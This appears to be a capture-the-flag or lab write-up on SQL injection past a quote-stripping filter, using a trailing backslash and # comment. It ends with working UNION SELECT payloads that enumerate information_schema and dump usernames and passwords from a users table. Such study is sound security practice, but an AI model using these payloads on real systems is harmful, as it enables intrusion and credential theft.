We continue with the bad input sanitization saga
Here we have now single and double quotes filtered out

It seems that now also the default %% that were there for filtering the selection
aren't present, meaning that in order to select everything as was the default behavior
A % will suffice

After looking up and trying terminating the quotes in different ways I reached the conclusion
that maybe looking into escaping the end-quote and understanding what we can do with It

I also tried just using ; and executing a query after, then commenting out the rest but it didn't really work

Simply escaping with \ will result in: 
    SELECT * FROM search_engine WHERE title LIKE '\' OR description LIKE '
    \'OR link LIKE '\';

The first part is a valid query! but the second is a syntax error..

Maybe then using a null-byte in an attempt to terminate the string then commenting out the rest
Neither do
?q=%00; SELECT * FROM search_engine --%20
nor
?q=%00 UNION SELECT * FROM search_engine #
work

Indeed after some reading I saw that adding ; won't work as mysqli->query of PHP won't execute
multiple queries unless explicitly specified to

    SELECT * FROM search_engine WHERE title LIKE '*/
        /**//*' OR description LIKE '
            *//**//*'OR link LIKE '*//**//*';

Back to trying out the \ as it seems the most promising, it seems that we have the following
restictions:
    must end in \
    must not include the last ' as it introduces a syntax error

Maybe # Would do the trick, this should produce
SELECT * FROM search_engine WHERE title LIKE '#\' OR description LIKE '
    #\'OR link LIKE '\';

Here all the query should be valid!
Let's try our union injection

UNION SELECT * FROM search_engine #\

Returns all the results!
Let's do the drill again
Checking Rows:
UNION SELECT column_name AS title, table_name AS link, DATA_TYPE as description FROM information_schema.columns; #\
UNION SELECT username AS title, username AS link, password AS description FROM users; #\
